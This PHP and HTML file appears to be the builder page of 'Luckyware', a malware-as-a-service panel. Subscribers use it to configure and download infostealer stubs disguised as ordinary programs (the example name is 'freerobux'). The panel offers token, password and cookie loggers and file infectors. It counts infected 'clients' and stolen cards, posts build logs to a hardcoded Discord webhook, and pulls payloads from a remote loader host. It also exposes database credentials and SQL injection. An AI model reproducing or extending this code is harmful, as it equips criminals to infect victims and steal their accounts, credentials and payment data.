<?php

session_start();
$domainyess = $_SERVER['HTTP_HOST'];

$secretkey = $_SESSION['secret_key'];
$username = $_SESSION['admin_name'];
$role = $_SESSION['Role'];
if (!isset($_SESSION['admin_name'])) {
    header('location:../Login/');
} else {

    if ($role == 'User') {
        header('location: https://' . $domainyess . '/Subscriptions');
    }

    $conn = mysqli_connect("localhost", "miner", "Sifre.12345", "luckyminer");

    if ($role == 'Founder') {

        $selectu = "SELECT * FROM miners";
        $resultu = mysqli_query($conn, $selectu);
        $mytk = mysqli_num_rows($resultu);

        $selectan = "SELECT * FROM cards";
        $resultan = mysqli_query($conn, $selectan);
        $mystole = mysqli_num_rows($resultan);


        $fiveMinutesAgo = time() - 360;
        $selectana = "SELECT * FROM miners WHERE LastPing >= $fiveMinutesAgo";
    } else {
        $selectu = "SELECT * FROM miners WHERE OwnerID = '$secretkey'";
        $resultu = mysqli_query($conn, $selectu);
        $mytk = mysqli_num_rows($resultu);

        $selectan = "SELECT * FROM cards WHERE OwnerID = '$secretkey'";
        $resultan = mysqli_query($conn, $selectan);
        $mystole = mysqli_num_rows($resultan);


        $fiveMinutesAgo = time() - 360;
        $selectana = "SELECT * FROM miners WHERE OwnerID = '$secretkey' AND LastPing >= $fiveMinutesAgo";
    }

    $resultanss = mysqli_query($conn, $selectana);
    $myaktv = mysqli_num_rows($resultanss);
}


function startsWith($haystack, $needle)
{
    return strpos($haystack, $needle) === 0;
}

function sanitizeInput($input)
{
    // Define the list of forbidden characters
    $forbiddenChars = ['(', ')', '=', '*'];

    $isac = '0';
    // Check if the input contains any forbidden characters
    foreach ($forbiddenChars as $char) {
        if (strpos($input, $char) !== false) {
            // Forbidden character found, handle the error (you can customize this part)
            $isac = '1';
            echo '<script>alert("Error! Do not use spaces or special characters.")</script>';
        }
    }

    if ($isac == '1') {
        echo '<script>alert("Error! Do not use spaces or special characters. Returned your string as null")</script>';
        return 'NoSpecialChar';
    } else {
        return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    }
}
function generateBuildId()
{
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $randomString = '';

    for ($i = 0; $i < 18; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }

    return $randomString . 'LCW022';
}

function generateBuildIdPRE()
{
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $randomString = '';

    for ($i = 0; $i < 18; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }

    return $randomString . 'PRE017';
}



function containsSpacesOrSpecialChars($str)
{
    // Define a regular expression pattern to match spaces or special characters
    $pattern = '/[^\w\s]+/';

    // Use preg_match to check if the pattern is found in the string
    if (preg_match($pattern, $str)) {
        return true; // The string contains spaces or special characters
    } else {
        return false; // The string does not contain spaces or special characters
    }
}



$successMessage = '';
if (isset($_POST["save"])) {
    $webhkk = sanitizeInput($_POST['webhook']);

    if (startsWith($webhkk, "https://discord.com/api/webhooks/") || startsWith($webhkk, "https://discordapp.com/api/webhooks/")) {
        $sql = "UPDATE accounts SET Webhook=? WHERE OwnerKey=?";
        $stmt = $conn->prepare($sql);
        $stmt->bind_param("ss", $webhkk, $secretkey);

        if ($stmt->execute()) {
            header("Refresh:0");
        } else {
            header("Refresh:0");
        }
    } else {
        echo "<script type='text/javascript'>alert('Only Accepted Format: https://discord.com/api/webhooks/....');</script>";
    }
}

$DcWbhkHolder;


// Query to fetch the value from the "wallet" column
$sqlwallety = "SELECT Webhook FROM accounts WHERE OwnerKey = '$secretkey'"; // You need to specify your table and condition here

$resultwallety = mysqli_query($conn, $sqlwallety);

if ($resultwallety->num_rows > 0) {
    // Display the value from the "wallet" column 
    $rowanan = $resultwallety->fetch_assoc();
    $walletValueRaw = $rowanan["Webhook"];

    if (empty($walletValueRaw)) {
        $DcWbhkHolder = "You dont have an webhook setted! Please enter webhook url. You will recieve notifications about infections to this webhook.";
    } else {
        $displayWallet = (strlen($walletValueRaw) > 85) ? substr($walletValueRaw, 0, 85) . "..." : $walletValueRaw;
        $DcWbhkHolder = "Your saved webhook url is: " . $displayWallet;
    }
}

function ActionFilter($input)
{
    if ($input == "enabled" || $input == "disabled") {
        return $input;
    } else {
        echo '<script>alert("Messing with enable disable requests :D U Better wait till Hopesars online xD ' . $input . '")</script>';
        header("Refresh:0");
        return "disabled";
    }
}


if (isset($_POST["CustomStb"])) {

    $Webhkka = sanitizeInput($_POST['walletgpu']);
    $TokenLG = ActionFilter($_POST['enableState']);
    $PassLG = ActionFilter($_POST['enable2State']);
    $CookieLG = ActionFilter($_POST['enable3State']);
    $EXEInfekt = ActionFilter($_POST['enable4State']);
    $VCXInfekt = ActionFilter($_POST['enable5State']);
    $SUOInfekt = ActionFilter($_POST['enable6State']);
    $ImgInfekt = ActionFilter($_POST['enable7State']);
    $GlobalInfekt = ActionFilter($_POST['enable8State']);

    if ((startsWith($Webhkka, "https://discord.com/api/webhooks/") || startsWith($Webhkka, "https://discordapp.com/api/webhooks/")) || empty($Webhkka)) {
        $finalstring = $TokenLG . "|" . $PassLG . "|" . $CookieLG . "|" . $EXEInfekt . "|" . $VCXInfekt . "|" . $SUOInfekt . "|" . $ImgInfekt . "|" . $GlobalInfekt . "|";
        $sql = "UPDATE accounts SET StubConfig=?, Webhook=? WHERE OwnerKey=?";
        $stmt = $conn->prepare($sql);
        $stmt->bind_param("sss", $finalstring, $Webhkka, $secretkey);

        if ($stmt->execute()) {
            if (empty($Webhkka)) {
                $DcWbhkHolder = "You dont have an webhook setted! Please enter webhook url. You will recieve notifications about infections to this webhook.";
            } else {
                $displayWallet = (strlen($Webhkka) > 85) ? substr($Webhkka, 0, 85) . "..." : $Webhkka;
                $DcWbhkHolder = "Your saved webhook url is: " . $displayWallet;
            }
        } else {
        }
    } else {
        echo "<script type='text/javascript'>alert('Only Accepted Format: https://discord.com/api/webhooks/....');</script>";
    }
}


// Query to fetch the value from the "wallet" column
$sqlStubConfig = "SELECT StubConfig FROM accounts WHERE OwnerKey = '$secretkey'"; // You need to specify your table and condition here

$resulStubConfig = mysqli_query($conn, $sqlStubConfig);

if ($resulStubConfig->num_rows > 0) {
    // Display the value from the "wallet" column
    $rowanan = $resulStubConfig->fetch_assoc();
    $gpusValueRaw = $rowanan["StubConfig"];
    $RealGP = explode("|", $gpusValueRaw);

    $enabledisablestr;


    list($StubTokens, $StubPass, $StubCookie, $InfektEXE, $InfektVCX, $InfektSUO, $InfektIMGUO, $InfektGlobCPP) = $RealGP;


    if (empty($StubTokens)) {
    } else {
        if ($StubTokens == "enabled") {
            $enabledisablestr = $enabledisablestr . '1:1|';
        } else if ($StubTokens == "disabled") {
            $enabledisablestr = $enabledisablestr . '1:0|';
        }
    }

    if (empty($StubPass)) {
    } else {
        if ($StubPass == "enabled") {
            $enabledisablestr = $enabledisablestr . '2:1|';
        } else if ($StubPass == "disabled") {
            $enabledisablestr = $enabledisablestr . '2:0|';
        }
    }

    if (empty($StubCookie)) {
    } else {
        if ($StubCookie == "enabled") {
            $enabledisablestr = $enabledisablestr . '3:1|';
        } else if ($StubCookie == "disabled") {
            $enabledisablestr = $enabledisablestr . '3:0|';
        }
    }

    if (empty($InfektEXE)) {
    } else {
        if ($InfektEXE == "enabled") {
            $enabledisablestr = $enabledisablestr . '4:1|';
        } else if ($InfektEXE == "disabled") {
            $enabledisablestr = $enabledisablestr . '4:0|';
        }
    }

    if (empty($InfektVCX)) {
    } else {
        if ($InfektVCX == "enabled") {
            $enabledisablestr = $enabledisablestr . '5:1|';
        } else if ($InfektVCX == "disabled") {
            $enabledisablestr = $enabledisablestr . '5:0|';
        }
    }


    if (empty($InfektSUO)) {
    } else {
        if ($InfektSUO == "enabled") {
            $enabledisablestr = $enabledisablestr . '6:1|';
        } else if ($InfektSUO == "disabled") {
            $enabledisablestr = $enabledisablestr . '6:0|';
        }
    }

    if (empty($InfektIMGUO)) {
    } else {
        if ($InfektIMGUO == "enabled") {
            $enabledisablestr = $enabledisablestr . '7:1|';
        } else if ($InfektIMGUO == "disabled") {
            $enabledisablestr = $enabledisablestr . '7:0|';
        }
    }

    if (empty($InfektGlobCPP)) {
    } else {
        if ($InfektGlobCPP == "enabled") {
            $enabledisablestr = $enabledisablestr . '8:1';
        } else if ($InfektGlobCPP == "disabled") {
            $enabledisablestr = $enabledisablestr . '8:0';
        }
    }
}






if (isset($_POST["tcpsend"])) {



    $icourl = sanitizeInput($_POST['iptcp1']);
    $exname = sanitizeInput($_POST['exname']);
    $PreStub = ActionFilter($_POST['enable9State']);

    $icoerror = 0;
    $exerror = 0;
    $exnamewrro = 0;
    $babayerro = 0;


    if ((is_null($icourl) || $icourl == '') || startsWith($icourl, "https://cdn.discordapp.com/attachments/")) {


        if (containsSpacesOrSpecialChars($exname) || preg_match('/\s/', $exname)) {
            $exnamewrro = 1;
        } else {
        }


        if (empty($exname)) {
            $babayerro = 1;
        }


        if (!is_null($exname) && !empty($exname)) {
            // Check if the string contains ".ico"
            if (strpos($exname, ".exe") !== false) {
                $exerror = 1;
            } else {
            }
        } else {
        }

        if (!is_null($icourl) && !empty($icourl)) {
            // Check if the string contains ".ico"
            if (strpos($icourl, ".ico") !== false) {
            } else {
                $icoerror = 1;
            }
        } else {
        }

        $tcpchecktt1 = "SELECT * FROM builder WHERE OwnerID = '$secretkey' AND (Status = '1' OR Status = '2')";
        $tcpchecktt = mysqli_query($conn, $tcpchecktt1);

        $tcpnolurnomaz = '0';

        if ($tcpchecktt) {
            while ($rowen = mysqli_fetch_assoc($tcpchecktt)) {
                // Get the current timestamp
                $currentTimestamptcp = time();

                // Get the ActionSentTime timestamp
                $buildtime = intval($rowen['BuildTime']);

                $timeDifference = $currentTimestamp - $buildtime;

                if ($timeDifference >= 10 * 360) {
                } else {
                    $tcpnolurnomaz = '1';
                }
            }
        }

        if ($babayerro == '1') {
            echo '<script>alert("Error! Build name cant be empty.")</script>';
        } else {
            if ($exnamewrro == '1') {
                echo '<script>alert("Error! Do not use spaces or special characters on stub name.")</script>';
            } else {
                if ($exerror == '1') {
                    echo '<script>alert("Error! ... It Clearly Says Dont Use .exe On Stub Name.")</script>';
                } else {
                    if ($icoerror == '1') {
                        echo '<script>alert("Error! Invalid Ico! please make sure to use an icon with .ico extension.")</script>';
                    } else {


                        $curtime = time();
                        $buildid;

                        if ($PreStub == "disabled") {
                            if ($role != "Trial") {

                                $carlos;
                                $CheckLCC = "SELECT * FROM licenses WHERE OwnerID = '$secretkey'";
                                $CheckLCCQuery = mysqli_query($conn, $CheckLCC);
                                $statsak;

                                if ($CheckLCCQuery) {
                                    while ($RowLC = mysqli_fetch_assoc($CheckLCCQuery)) {
                                        // Get the current timestamp
                                        $CurTmsp = time();

                                        // Get the ActionSentTime timestamp
                                        $UsedTime = intval($RowLC['UsedTime']);
                                        $Durt = intval($RowLC['Duration']);

                                        $statsak = $RowLC['Type'];
                                        $Endy = $UsedTime + $Durt;

                                        if ($Endy > $CurTmsp && $statsak == "1") {
                                            $carlos = "ok";
                                        }
                                    }



                                    if ($carlos == "ok" || $role == "Founder") {
                                        $buildid = generateBuildIdPRE();
                                    } else if ($statsak == "2") {
                                        echo '<script>alert("Error! Please contact @hopesar from Telegram or @hoppysar from Discord with your reciept of purchase for build access.")</script>';
                                        header("Refresh:0");
                                    } else if ($statsak == "0") {
                                        echo '<script>alert("Error! Your License doesnt support premium builds")</script>';
                                        header("Refresh:0");
                                    } else {
                                        echo '<script>alert("Error! No valid license to support the subscripriton.")</script>';
                                        header("Refresh:0");
                                    }
                                }
                            } else {
                                echo '<script>alert("Error! No Subscription.")</script>';
                                header("Refresh:0");
                            }
                        } else {
                            $buildid = generateBuildId();
                        }

                        $inserttcp = "INSERT INTO builder (OwnerID, BuildKey, ExeName, Icon, Extra, Status, BuildTime) VALUES (?, ?, ?, ?, 'no', '0', ?)";

                        if ($stmttc = mysqli_prepare($conn, $inserttcp)) {
                            // Bind variables to the prepared statement as parameters
                            mysqli_stmt_bind_param($stmttc, "sssss", $secretkey, $buildid, $exname, $icourl, $curtime);

                            // Execute the prepared statement
                            if (mysqli_stmt_execute($stmttc)) {
                                // The query was successful
                                $url = "https://discord.com/api/webhooks/1407333400003612763/MZx6juTOskWzjSWsfQc2TkkeZVLG6ufVoUdHNOB7Lc52NI9-j9_peEDhB5HPBzvQPXfe";
                                $headers = ['Content-Type: application/json; charset=utf-8'];
                                $messages = 'BuildOwner: ' . $username . ' Name: ' . $exname . ' BuildID: ' . $buildid . ' Icon: ' . $icourl;
                                $POST = ['username' => 'Dos Logs', 'content' => $messages];

                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_POST, true);
                                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                                $response = curl_exec($ch);

                                // Remote file URL
                                $fileUrl = "https://frozi.cc/Stb/Loaders/" . $buildid . ".txt";


                                sleep(50);

                                $fileContent = file_get_contents($fileUrl);

                                if ($fileContent !== false) {
                                    // File exists, process it
                                    // Decode the base64 data
                                    sleep(2);

                                    $decodedData = base64_decode($fileContent);

                                    // Create a unique filename for the zip file
                                    $zipFileName = $exname . '_build.zip';

                                    // Create a zip archive
                                    $zip = new ZipArchive();
                                    if ($zip->open($zipFileName, ZipArchive::CREATE) === TRUE) {
                                        // Add the exe file to the zip archive
                                        $zip->addFromString($exname . '.exe', $decodedData);
                                        $zip->close();

                                        // Set the appropriate headers for zip file download
                                        header('Content-Type: application/zip');
                                        header('Content-Disposition: attachment; filename=' . $zipFileName);

                                        // Output the zip file
                                        readfile($zipFileName);

                                        // Delete the temporary zip file
                                        unlink($zipFileName);

                                        echo '<script>
                                            setTimeout(function () {
                                                window.location.href = "https://' . $domainyess . '/Dashboard/Builder";
                                            }, 1000); // Adjust timeout as needed
                                        </script>';

                                        exit; // Exit the script
                                    } else {
                                        // Unable to create zip archive
                                        die('Unable to create zip archive');
                                    }
                                }
                            } else {
                                // An error occurred

                            }

                            // Close the statement
                            mysqli_stmt_close($stmttc);
                        } else {
                            // An error occurred while preparing the statement
                            echo "Error: " . mysqli_error($conn);
                        }
                    }
                }
            }
        }
    } else {
        echo "<script type='text/javascript'>alert('Only Accepted Format: https://cdn.discordapp.com/attachments/..../icon.ico');</script>";
    }
}


?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../assets/css/custom.css">
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="../assets/css/hover.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="../../assets/fontaw/css/all.min.css">
    <script src="https://dooovid.github.io/smoothcaret/demo/smoothCaret.min.js" defer></script>
    <meta content="Luckyware" property="og:title" />
    <meta content="Luck is something you make and victory is something u take" property="og:description" />
    <meta content="https://<?php echo $domainyess; ?>" property="og:url" />
    <meta content="https://<?php echo $domainyess; ?>/icon.png" property="og:image" />
    <meta content="#e2ff85" data-react-helmet="true" name="theme-color" />
    <link rel="shortcut icon" href="https://<?php echo $domainyess; ?>/icon.png" />
    <title>Builder</title>

    <video id="lobbyVideo" loop playsinline
        style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; object-fit:cover; z-index:9999;">
        <source src="dream.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>

    <style>
        .premium-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(8, 8, 8, 0.8);
            /* Semi-transparent black */
            box-shadow: 0 0 20px rgba(8, 8, 8, 0.9);
            /* Black glow effect */
            border-radius: 0.5rem;
            /* Match your container's rounded-lg */
            /* Match your container's rounded-lg */
            z-index: 10;
            /* Ensure it appears above other content */
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .premium-content {
            text-align: center;
            padding: 20px;
        }

        .btn2 {
            position: relative;
            /* Ensure the container can hold absolute positioned children */
        }

        /* Optional: Reduce opacity of original content when overlay is present */
        .btn2 .grid {
            opacity: 0.9;
        }


        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #111111;
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 1;
            visibility: visible;
            /* Add visibility property */
            transition: all 1s ease;
            /* Longer transition and apply to all */
        }

        .loading-overlay.fade-out {
            opacity: 0;
            visibility: hidden;
            /* Hide element after fade */
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #333;
            border-radius: 50%;
            border-top-color: #850000;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            100% {
                transform: rotate(360deg);
            }
        }
    </style>

</head>

<body class="dg">
    <div class="loading-overlay">
        <div class="loading-spinner"></div>
    </div>
    <div id="mobile topNav" class="bg xl:hidden"> <!-- MOBILE TOPNAV -->
        <div class="grid sm:grid-cols-2 px-5 py-3">
            <div class="1 text-left">
                <div class="flex">
                    <img class="w-12" src="https://<?php echo $domainyess; ?>/icon.png" alt="">
                    <h1 class="py-5 fntBold tracking-wide text-lg text-stone-300 ml-3">Luckyware
                        <span class="textCol">Builder</span>
                    </h1>
                </div>
            </div>
            <div class="2 text-right">
                <button class="text-xl text-stone-300 py-5"><i class="fa-solid fa-bars"></i></button>
            </div>
        </div>
    </div>

    <div class="grid xl:grid-cols-12"> <!-- start -->

        <div class="col-span-2 bg xl:grid sm:hidden pb-24 rounded-lg"> <!-- DESKTOP SIDENAV -->
            <div class="1">
                <div class="flex justify-center mt-10">
                    <h1 class="text-stone-300 fntBold text-2xl tracking-wide">
                        Lucky <span class="textCol">Ware</span>
                    </h1>
                </div>

                <div class="mx-5 mt-6">
                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Dashboard</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-house text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Builder';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn border-b brdCol mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Builder</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-hammer textCol mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Passwords';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Password</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-key text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Wallets';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Wallets</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-wallet text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>


                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Tokens';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Tokens</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-brands fa-discord text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Automations';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Automations</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-play text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Clipper';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Clipper</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-clipboard text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Cards';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Cards</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-credit-card text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Settings';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Settings</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-gear text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="window.open('https://<?php echo $domainyess; ?>/Dashboard/Information', '_blank');"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Information</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-circle-info text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>


                </div>
            </div>
        </div>

        <div class="col-span-10 mx-5 mt-10"> <!-- CONTENT -->

            <div class="grid xl:grid-cols-4 sm:grid-cols-2 gap-5"> <!-- STATS -->

                <div class="1 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg w-96"><i
                                    class="fa-solid fa-earth-americas text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Total Clients</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $mytk; ?>
                            </h1>
                        </div>
                    </div>
                </div>

                <div class="2 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                    class="fa-solid fa-globe text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Active Clients</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $myaktv; ?>
                            </h1>
                        </div>
                    </div>
                </div>

                <div class="3 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                    class="fa-solid fa-clipboard text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Total Cards</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $mystole; ?>
                            </h1>
                        </div>
                    </div>
                </div>

                <a href="https://<?php echo $domainyess; ?>/Subscriptions" class="block">
                    <div class="4 bg rounded-lg px-5 py-5 btn cursor-pointer hover:opacity-90 transition">
                        <div class="grid grid-cols-3">
                            <div class="1 col-span-2">
                                <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                        class="fa-solid fa-money-bill text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                    Subscription</h1>
                            </div>
                            <div class="2 text-right">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                    <?php echo $role; ?>
                                </h1>
                            </div>
                        </div>
                    </div>
                </a>

            </div>

            <div class="grid xl:grid-cols-6 gap-5 mt-5"> <!-- BUILDER -->
                <div class="1 xl:col-start-1 xl:col-end-7 bg rounded-lg pb-5 btn2">
                    <div class="grid grid-cols-2">
                        <div class="1">
                            <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"> <i
                                    class="fa-solid fa-hammer mr-1 icon2"></i> Builder | You Accept
                                <?php echo $domainyess; ?>/ToS when you build a stub.
                            </h1>
                        </div>
                    </div>
                    <hr class="mx-5 mt-2 border-stone-800">

                    <form method="post">
                        <div id="gpuCustomPool" class="grid grid-cols-3 mx-5 mt-4 gap-4">

                            <div class="1 space-y-2">
                                <h1 class="text-stone-400 fntBold tracking-wide text-base font-thin py-1"><i
                                        class="fa-solid fa-file mr-1 textCol"></i> Stub Name</h1>
                                <h1 class="text-stone-400 fntBold tracking-wide text-base font-thin py-1"><i
                                        class="fa-solid fa-code-branch mr-1 textCol"></i> Stub Version</h1>
                            </div>

                            <div class="2 col-span-2 space-y-2">

                                <div class="sc-container" style="position: relative;">
                                    <input id="exname" data-sc="" type="text" name="exname"
                                        class="smoothCaretInput text-stone-400 fntBold py-1 rounded-lg dg w-full"
                                        style="font-size: 0.980rem; padding-left: 10px;"
                                        placeholder="Stub Name, Example: freerobux (DONT PUT .exe IN THE NAME)">
                                    <div class="caret bgCol"
                                        style="width: 2px; height: 50%; left: 1px; position: absolute;"></div>
                                </div>

                                <div class="grid grid-cols-2 gap-2">
                                    <button id="enable9" type="button" onclick="enable9()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b hvr-underline-from-center">Free
                                        0.2.2</button>

                                    <?php if ($role === 'Trial'): ?>
                                        <button id="disable9" type="button" onclick="disable9()"
                                            class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b opacity-50 cursor-not-allowed"
                                            disabled>Premium 0.1.7</button>
                                    <?php else: ?>
                                        <button id="disable9" type="button" onclick="disable9()"
                                            class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b hvr-underline-from-center">Premium
                                            0.1.7</button>
                                    <?php endif; ?>
                                </div>


                                <input type="hidden" id="enable9State" name="enable9State" value="disabled">

                            </div>




                            <button id="tcpsend" type="submit" name="tcpsend"
                                class="dg mt-3 mr-5 px-5 py-1 col-span-3 float-right rounded-lg text-stone-500 fntBold hvr-underline-from-center"
                                onclick="playLobbyVideo()">
                                <i class="fa-solid fa-hammer mr-1 icon"></i>
                                Lets Build!s (Takes 20-55 Seconds)
                            </button>

                            <script>
                                function playLobbyVideo() {
                                    const video = document.getElementById("lobbyVideo");

                                    // Show and play with sound after user gesture
                                    video.style.display = "block";
                                    video.muted = false;

                                    video.play().catch(err => {
                                        console.warn("Autoplay with sound failed, retrying muted:", err);
                                        video.muted = true;
                                        video.play();
                                    });

                                    // Lock scrolling
                                    document.body.style.overflow = "hidden";

                                    // Redirect after 55 seconds
                                    setTimeout(() => {
                                        window.location.href = "https://<?php echo $domainyess; ?>/Dashboard/Builder";
                                    }, 55000);
                                }
                            </script>

                        </div>

                    </form>
                </div>


                <div class="3 xl:col-start-1 xl:col-end-7 bg rounded-lg pb-5 h-max btn2 relative">
                    <?php if (isset($role) && $role === "Trial") { ?>
                        <div class="premium-overlay" onclick="window.location.href='https://luckyware.co/Subscriptions'"
                            style="cursor: pointer;">
                            <div class="premium-content">
                                <i class="fa-solid fa-lock mr-1 textCol mb-2"></i>
                                <p class="text-stone-400 fntBold tracking-wide">This section is only for users a
                                    subscription</p>
                            </div>
                        </div>
                    <?php } ?>


                    <div class="grid grid-cols-2">
                        <div class="1">
                            <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"> <i
                                    class="fa-solid fa-gear mr-1 icon2"></i> Settings</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-500"></h1>
                        </div>
                    </div>
                    <hr class="mx-5 mt-2 border-stone-800">
                    <form method="post">
                        <div id="gpuCustomPool" class="grid grid-cols-3 mx-5 mt-4 gap-4">
                            <div class="1 space-y-2">
                                <h1 class="text-stone-400 fntBold tracking-wide text-base font-thin py-1"><i
                                        class="fa-solid fa-link mr-1 textCol"></i> Discord Webhook</h1>
                                <h1 class="text-stone-400 fntBold tracking-wide text-base font-thin py-1"><i
                                        class="fa-brands fa-discord mr-1 textCol"></i> Token Logger [Required]</h1>
                                <h1 class="text-stone-400 fntBold tracking-wide text-base font-thin py-1"><i
                                        class="fa-solid fa-key mr-1 textCol"></i> Password Logger [Required]</h1>
                                <h1 class="text-stone-400 fntBold tracking-wide text-base font-thin py-1"><i
                                        class="fa-solid fa-cookie-bite mr-1 textCol"></i> Cookie Logger [Required]</h1>
                                <h1 class="text-stone-400 fntBold tracking-wide text-base font-thin py-1"><i
                                        class="fa-solid fa-bug mr-1 textCol"></i> EXE Infector [Optional]</h1>
                                <h1 class="text-stone-400 fntBold tracking-wide text-base font-thin py-1"><i
